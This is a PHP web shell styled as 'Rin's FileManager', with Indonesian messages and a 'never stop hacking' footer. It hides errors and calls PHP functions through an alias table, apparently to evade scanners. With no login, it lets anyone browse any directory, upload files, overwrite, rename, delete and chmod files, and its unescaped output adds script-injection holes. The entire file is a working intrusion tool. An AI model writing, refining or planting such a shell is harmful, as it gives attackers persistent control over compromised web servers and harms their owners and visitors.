<?php
@error_reporting(0);

$fx = [
  'cwd' => 'getcwd',
  'chd' => 'chdir',
  'ls'  => 'scandir',
  'rm'  => 'unlink',
  'rn'  => 'rename',
  'up'  => 'move_uploaded_file',
  'put'=> 'file_put_contents',
  'get'=> 'file_get_contents',
  'sz' => 'filesize',
  'is' => 'is_dir',
  'chm'=> 'chmod',
  'oct'=> 'octdec'
];

if (isset($_GET['d'])) $fx['chd']($_GET['d']);
$pwd = $fx['cwd']();
$list = $fx['ls']($pwd);

if ($_FILES['f']) {
  $tmp = $_FILES['f']['tmp_name'];
  $name = basename($_FILES['f']['name']);
  $dest = $pwd . "/" . preg_replace('/[^a-zA-Z0-9_\.-]/', '_', $name);
  if ($fx['up']($tmp, $dest)) echo "<b>Upload sukses:</b> $name<br>";
  else echo "<b>Gagal upload!</b><br>";
}

if ($_POST['a'] === 'rename') {
  $fx['rn']($_POST['src'], $_POST['dst']);
}
if ($_POST['a'] === 'edit') {
  $fx['put']($_POST['src'], $_POST['dat']);
}
if ($_POST['a'] === 'chmod') {
  $fx['chm']($_POST['src'], $fx['oct']($_POST['perm']));
}
if (isset($_GET['del'])) {
  $fx['rm']($_GET['del']);
}

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Rin FileManager</title>
<style>
body{background:#111;color:#0f0;font-family:monospace}
a{color:#0ff;text-decoration:none}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #333;padding:5px}
input,textarea{background:#222;color:#0f0;border:1px solid #444}
h1{color:#0ff}
footer{margin-top:20px;text-align:center;color:#555}
</style></head><body>";

echo "<h1 style='display:flex;align-items:center;gap:10px'>
<span style='font-size:24px'>&#128187;</span> Rin's FileManager
</h1>";

echo "<h3>Dir: $pwd</h3>
<form method=POST enctype='multipart/form-data'>
<input type=file name=f><input type=submit value='Upload'></form><br>";

echo "<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach ($list as $f) {
  if ($f === '.') continue;
  $path = $pwd . '/' . $f;
  $size = $fx['is']($path) ? '[DIR]' : $fx['sz']($path);
  $link = $fx['is']($path) ? "?d=$path" : "#";
  echo "<tr><td><a href='$link'>$f</a></td><td>$size</td><td>
  <a href='?del=$path'>Del</a> |
  <a href='?r=$path'>Rename</a> |
  <a href='?e=$path'>Edit</a> |
  <a href='?c=$path'>Chmod</a></td></tr>";
}
echo "</table>";

if (isset($_GET['r'])) {
  $f = $_GET['r'];
  echo "<h4>Rename</h4><form method=POST>
  <input type=hidden name=a value='rename'>
  <input type=text name=src value='$f'>
  <input type=text name=dst value='$f'>
  <input type=submit value='Rename'></form>";
}
if (isset($_GET['e']) && is_file($_GET['e'])) {
  $f = $_GET['e'];
  $data = htmlspecialchars($fx['get']($f));
  echo "<h4>Edit</h4><form method=POST>
  <input type=hidden name=a value='edit'>
  <input type=text name=src value='$f'><br>
  <textarea name=dat rows=10 cols=80>$data</textarea><br>
  <input type=submit value='Save'></form>";
}
if (isset($_GET['c'])) {
  $f = $_GET['c'];
  echo "<h4>Chmod</h4><form method=POST>
  <input type=hidden name=a value='chmod'>
  <input type=text name=src value='$f'>
  <input type=text name=perm placeholder='0777'>
  <input type=submit value='Apply'></form>";
}

echo "<footer><hr><small>
<span style='font-size:16px'>&#128187;</span> Made with <span style='color:#f66'>&lt;3</span> by Rin & Guru<br>
<i>never stop hacking</i>
</small></footer></body></html>";
?>